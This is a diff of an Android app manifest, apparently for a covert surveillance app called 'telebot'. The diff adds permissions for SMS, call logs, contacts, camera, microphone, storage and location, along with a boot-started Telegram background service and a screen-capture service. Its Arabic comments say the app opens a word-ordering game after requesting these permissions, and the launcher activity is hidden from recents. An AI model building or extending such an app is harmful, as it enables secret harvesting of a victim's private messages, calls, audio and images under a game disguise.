@@ -2,35 +2,65 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.silent.telebot">
 
+    <!-- جميع الأذونات المطلوبة -->
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
 
     <application
         android:allowBackup="true"
         android:label="المايسترو"
-        android:theme="@style/Theme.AppCompat.NoActionBar">
+        android:theme="@style/Theme.AppCompat.NoActionBar"
+        android:requestLegacyExternalStorage="true">
 
+        <!-- النشاط الرئيسي (يطلب الأذونات ثم يفتح اللعبة) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:theme="@style/Theme.AppCompat.NoActionBar">
+            android:theme="@style/Theme.AppCompat.NoActionBar"
+            android:excludeFromRecents="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <!-- نشاط اللعبة -->
         <activity
             android:name=".WordOrderActivity"
             android:exported="false"
             android:theme="@style/Theme.AppCompat.NoActionBar" />
 
+        <!-- خدمة الخلفية -->
         <service
             android:name=".TelegramService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
+
+        <!-- خدمة لقطة الشاشة (إذا كنت تستخدمها) -->
+        <service
+            android:name=".ScreenCaptureService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <!-- FileProvider للكاميرا (إذا احتجت) -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@raw/file_paths" />
+        </provider>
 
     </application>
 </manifest>
